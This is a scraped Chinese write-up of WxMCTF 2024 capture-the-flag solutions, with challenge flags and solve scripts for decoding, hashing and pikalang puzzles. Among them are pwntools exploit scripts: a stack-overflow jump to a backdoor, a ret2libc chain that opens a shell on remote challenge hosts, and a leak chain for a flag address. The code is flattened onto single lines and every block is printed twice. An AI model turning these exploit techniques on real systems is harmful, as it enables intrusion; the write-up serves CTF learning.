# UKFC2024 WXMCTF WP及赛后锐评

> 原文: https://www.ctfiot.com/175095.html
> ID: 175095

介绍：Spanning from March 8th at 19:00 EST to March 10th at 19:00 EST, we are excited to announce that X Series CTF is hosting our 2nd WxMCTF cybersecurity competition with $23000 in prizes!

import os folder_path = "./firstgrep" # 遍历文件夹下所有文件for root, dirs, files in os.walk(folder_path): for file_name in files: if(file_name == 'cal.py'): continue file_path = os.path.join(root, file_name) with open(file_path, 'r') as file: content = file.read() print(file_name,"t",content)

with open('./answer.txt', 'r') as f: bread = f.read() for i in bread.split(" "): tr=int(i, 2) print(chr(tr),end=" ")
#wxmctf{Eightfold Battle Formation}

# 读取包含文件数据的十六进制文件with open('C:\Users\lenovo\Desktop\_ctf_poem\wmctf\2024\checker.txt', 'r') as file: hex_data = file.read()i=0# 提取中间的数据部分start_index = hex_data.find(' ')+2end_index = hex_data.find('|')print(start_index)print(end_index)
while(1): data = hex_data[start_index:end_index]
 # 去除空格和换行符 data = data.replace(' ', '').replace('n', '')
 # 保留有效的十六进制字符 valid_chars = set('0123456789abcdef') data = ''.join(c for c in data if c in valid_chars)
 # 将十六进制数据转换为二进制数据 binary_data = bytes.fromhex(data)
 # 将二进制数据写入新文件 with open('C:\Users\lenovo\Desktop\_ctf_poem\wmctf\2024\123.txt', 'ab+') as file: file.write(binary_data) stt="000038c0 9b 30 00 00 00 00 00 00 0a 01 00 00 00 00 00 00 |.0..............|" start_index+=len(stt)+1 end_index+=len(stt)+1 i+=1 if i>=0x38e8: break
print("数据恢复完成。")

from hashlib import sha512
def acid(s): return sha512(s.encode('utf-8')).hexdigest()
def rock(a, n): return a**ndef paper(n): x = n**n return {i: [0, 2**i, 2*(2**i), 3*(2**i)] for i in range(x)}
def scissors(n, a, x):#进制转换 if n == 0: return [0]*x ls = [int(n%a)] + [int(n%a) for _ in range(n) if (n := n // a)] ls += [0]*(x-len(ls)) return ls
def go(n): final, lib, x = 0, paper(n), n**n for i in range(2**(x+1)): ls = scissors(i, 4, x)
 tot = sum( [lib[j][ls[j]] for j in range(x)] )
 final += int(tot == n) return final
HASH = "87bd6b7109f0e4fddc549076c983ef165191a655d0e53848e18ea55574b8344456478b6e7b19fa26ecc3ddf017b29d1b63da94c7002a508429e156b9ccfed611"
number = int(input("Enter your number: "))#aaaa=6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574027791115057150#print(acid(str(aaaa)))print(go(number))if (acid(str(number)) != HASH): print("Incorrect number! SHA hashes do not match")else: print("Congratulations! That is the correct number!")

from tokenize import blank_refrom pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('fac9795.678470.xyz ',30170)else: io=process('/home/kali/Downloads/assgn1_2o3BvZ6')elf = ELF('/home/kali/Downloads/assgn1_2o3BvZ6')
backdoor_addr=0x8049216
payload=b'a'*0x28+p32(backdoor_addr)io.recvuntil(b'info: n')io.sendline(payload)
io.interactive()

from tokenize import blank_refrom pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('5d11994.678470.xyz',31124)else: io=process('/home/kali/Downloads/vuln')elf = ELF('/home/kali/Downloads/vuln')libc=ELF('/home/kali/Downloads/libc.so.6')
#gdb.attach(io)io.recvuntil(b'0x')printf_addr=int(io.recvuntil(b'n'),16)print('printf_addr==========>',hex(printf_addr))
base_addr=printf_addr-libc.symbols['printf']system_addr=base_addr+libc.symbols['system']gets_addr=base_addr+libc.symbols['gets']binsh_offset=0x01BD0D5binsh_addr=base_addr+binsh_offsetprint('system_addr=========>',hex(system_addr))print('binsh_addr=========>',hex(binsh_addr))
payload=b'a'*(0x28+4)+p32(0x08049127)+p32(system_addr)+p32(0)+p32(binsh_addr)
pause()#io.recvuntil(b'n')io.sendline(payload)
io.interactive()

from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
io = process('./pwn')io = remote('5.161.99.196',32450)elf = ELF('./pwn')
def dbg(): gdb.attach(io) pause()
def continueio(): io.recvuntil(b'Continue? (Y/n)') io.sendline(b'Y')
io.sendafter(b'name?',cyclic(0x21))io.recvuntil(b'aaai')heap_leak_addr = u64((io.recv(5).rjust(6,b'x00')).ljust(8,b'x00'))print(hex(heap_leak_addr))continueio()
heap_needleak_addr = heap_leak_addr + (0x718 - 0x600)print(hex(heap_needleak_addr))payload1 = b'a' * 0x20 + p64(heap_needleak_addr)io.sendafter(b'name?',payload1)
io.recvuntil(b'a'*0x20)libc_leak = u64(io.recv(6).ljust(8,b'x00'))print(hex(libc_leak))
pause()
io.recvuntil(b':3n')libc_leaked = u64(io.recv(6).ljust(8,b'x00'))print(hex(libc_leaked))environ_addr = libc_leaked - (0x7fbea1be3380 - 0x7fbea1bea200)print(hex(environ_addr))
payload2 = b'a' * 0x20 + p64(environ_addr)io.sendafter(b'name?',payload2)
io.recvuntil(b':3n')stack_leaked = u64(io.recv(6).ljust(8,b'x00'))print(hex(stack_leaked))continueio()
main_leaked = stack_leaked + (0x7ffd2135d480 - 0x7ffd2135d5f8)print(hex(main_leaked)) 
payload3 = b'a' * 0x20 + p64(main_leaked)io.sendafter(b'name?',payload3)io.recvuntil(b':3n')pie_off = u64(io.recv(6).ljust(8,b'x00')) - 0x137Eprint(hex(pie_off))
flag_addr = (0x55c91dcf20c0 - 0x55c91dcee000) + pie_offprint(hex(flag_addr))
payload4 = b'a' * 0x20 + p64(flag_addr)io.sendafter(b'name?',payload4)
io.interactive()

import pikalang
sourcecode = """ pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka pikachu pi pi pikachu ka ka ka ka ka ka ka ka ka ka pikachu ka ka pikachu pi pi pi pi pikachu pi pi pi pi pi pikachu ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pi pikachu pi pi pi pi pikachu pichu pichu pichu pikachupi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka pikachu pi pi pikachu ka ka ka ka ka ka ka ka ka ka pikachu ka ka pikachu pi pi pi pi pikachu pi pi pi pi pi pikachu ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pi pikachu pi pi pi pi pikachu pichu pichu pichu pikachu """
# or use sourcecode = pikalang.load_source("FILENAME.pokeball") to load from file
pikalang.evaluate(sourcecode)

<!DOCTYPE html><head> <link rel="stylesheet" href="styles.css"></head><body> Welcome to my John Cena fan page!! <img src="john1.webp" style="max-height: 400px;"> <div id="secret"> wxmctf{4nd_h1s_n4me_1s!!!!!!!} </div></body>


```
import os folder_path = "./firstgrep" # 遍历文件夹下所有文件for root, dirs, files in os.walk(folder_path): for file_name in files: if(file_name == 'cal.py'): continue file_path = os.path.join(root, file_name) with open(file_path, 'r') as file: content = file.read() print(file_name,"t",content)
```



```
with open('./answer.txt', 'r') as f: bread = f.read() for i in bread.split(" "): tr=int(i, 2) print(chr(tr),end=" ")
#wxmctf{Eightfold Battle Formation}
```



```
# 读取包含文件数据的十六进制文件with open('C:\Users\lenovo\Desktop\_ctf_poem\wmctf\2024\checker.txt', 'r') as file: hex_data = file.read()i=0# 提取中间的数据部分start_index = hex_data.find(' ')+2end_index = hex_data.find('|')print(start_index)print(end_index)
while(1): data = hex_data[start_index:end_index]
 # 去除空格和换行符 data = data.replace(' ', '').replace('n', '')
 # 保留有效的十六进制字符 valid_chars = set('0123456789abcdef') data = ''.join(c for c in data if c in valid_chars)
 # 将十六进制数据转换为二进制数据 binary_data = bytes.fromhex(data)
 # 将二进制数据写入新文件 with open('C:\Users\lenovo\Desktop\_ctf_poem\wmctf\2024\123.txt', 'ab+') as file: file.write(binary_data) stt="000038c0 9b 30 00 00 00 00 00 00 0a 01 00 00 00 00 00 00 |.0..............|" start_index+=len(stt)+1 end_index+=len(stt)+1 i+=1 if i>=0x38e8: break
print("数据恢复完成。")
```



```
from hashlib import sha512
def acid(s): return sha512(s.encode('utf-8')).hexdigest()
def rock(a, n): return a**ndef paper(n): x = n**n return {i: [0, 2**i, 2*(2**i), 3*(2**i)] for i in range(x)}
def scissors(n, a, x):#进制转换 if n == 0: return [0]*x ls = [int(n%a)] + [int(n%a) for _ in range(n) if (n := n // a)] ls += [0]*(x-len(ls)) return ls
def go(n): final, lib, x = 0, paper(n), n**n for i in range(2**(x+1)): ls = scissors(i, 4, x)
 tot = sum( [lib[j][ls[j]] for j in range(x)] )
 final += int(tot == n) return final
HASH = "87bd6b7109f0e4fddc549076c983ef165191a655d0e53848e18ea55574b8344456478b6e7b19fa26ecc3ddf017b29d1b63da94c7002a508429e156b9ccfed611"
number = int(input("Enter your number: "))#aaaa=6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574027791115057150#print(acid(str(aaaa)))print(go(number))if (acid(str(number)) != HASH): print("Incorrect number! SHA hashes do not match")else: print("Congratulations! That is the correct number!")
```



```
from tokenize import blank_refrom pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('fac9795.678470.xyz ',30170)else: io=process('/home/kali/Downloads/assgn1_2o3BvZ6')elf = ELF('/home/kali/Downloads/assgn1_2o3BvZ6')
backdoor_addr=0x8049216
payload=b'a'*0x28+p32(backdoor_addr)io.recvuntil(b'info: n')io.sendline(payload)
io.interactive()
```



```
from tokenize import blank_refrom pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('5d11994.678470.xyz',31124)else: io=process('/home/kali/Downloads/vuln')elf = ELF('/home/kali/Downloads/vuln')libc=ELF('/home/kali/Downloads/libc.so.6')
#gdb.attach(io)io.recvuntil(b'0x')printf_addr=int(io.recvuntil(b'n'),16)print('printf_addr==========>',hex(printf_addr))
base_addr=printf_addr-libc.symbols['printf']system_addr=base_addr+libc.symbols['system']gets_addr=base_addr+libc.symbols['gets']binsh_offset=0x01BD0D5binsh_addr=base_addr+binsh_offsetprint('system_addr=========>',hex(system_addr))print('binsh_addr=========>',hex(binsh_addr))
payload=b'a'*(0x28+4)+p32(0x08049127)+p32(system_addr)+p32(0)+p32(binsh_addr)
pause()#io.recvuntil(b'n')io.sendline(payload)
io.interactive()
```



```
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
io = process('./pwn')io = remote('5.161.99.196',32450)elf = ELF('./pwn')
def dbg(): gdb.attach(io) pause()
def continueio(): io.recvuntil(b'Continue? (Y/n)') io.sendline(b'Y')
io.sendafter(b'name?',cyclic(0x21))io.recvuntil(b'aaai')heap_leak_addr = u64((io.recv(5).rjust(6,b'x00')).ljust(8,b'x00'))print(hex(heap_leak_addr))continueio()
heap_needleak_addr = heap_leak_addr + (0x718 - 0x600)print(hex(heap_needleak_addr))payload1 = b'a' * 0x20 + p64(heap_needleak_addr)io.sendafter(b'name?',payload1)
io.recvuntil(b'a'*0x20)libc_leak = u64(io.recv(6).ljust(8,b'x00'))print(hex(libc_leak))
pause()
io.recvuntil(b':3n')libc_leaked = u64(io.recv(6).ljust(8,b'x00'))print(hex(libc_leaked))environ_addr = libc_leaked - (0x7fbea1be3380 - 0x7fbea1bea200)print(hex(environ_addr))
payload2 = b'a' * 0x20 + p64(environ_addr)io.sendafter(b'name?',payload2)
io.recvuntil(b':3n')stack_leaked = u64(io.recv(6).ljust(8,b'x00'))print(hex(stack_leaked))continueio()
main_leaked = stack_leaked + (0x7ffd2135d480 - 0x7ffd2135d5f8)print(hex(main_leaked)) 
payload3 = b'a' * 0x20 + p64(main_leaked)io.sendafter(b'name?',payload3)io.recvuntil(b':3n')pie_off = u64(io.recv(6).ljust(8,b'x00')) - 0x137Eprint(hex(pie_off))
flag_addr = (0x55c91dcf20c0 - 0x55c91dcee000) + pie_offprint(hex(flag_addr))
payload4 = b'a' * 0x20 + p64(flag_addr)io.sendafter(b'name?',payload4)
io.interactive()
```



```
import pikalang
sourcecode = """ pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka pikachu pi pi pikachu ka ka ka ka ka ka ka ka ka ka pikachu ka ka pikachu pi pi pi pi pikachu pi pi pi pi pi pikachu ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pi pikachu pi pi pi pi pikachu pichu pichu pichu pikachupi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka pikachu pi pi pikachu ka ka ka ka ka ka ka ka ka ka pikachu ka ka pikachu pi pi pi pi pikachu pi pi pi pi pi pikachu ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pi pi pikachu pi pi pi pi pikachu pichu pichu pichu pikachu """
# or use sourcecode = pikalang.load_source("FILENAME.pokeball") to load from file
pikalang.evaluate(sourcecode)
```



```
<!DOCTYPE html><head> <link rel="stylesheet" href="styles.css"></head><body> Welcome to my John Cena fan page!! <img src="john1.webp" style="max-height: 400px;"> <div id="secret"> wxmctf{4nd_h1s_n4me_1s!!!!!!!} </div></body>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1713713245.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/3-1713713245.png)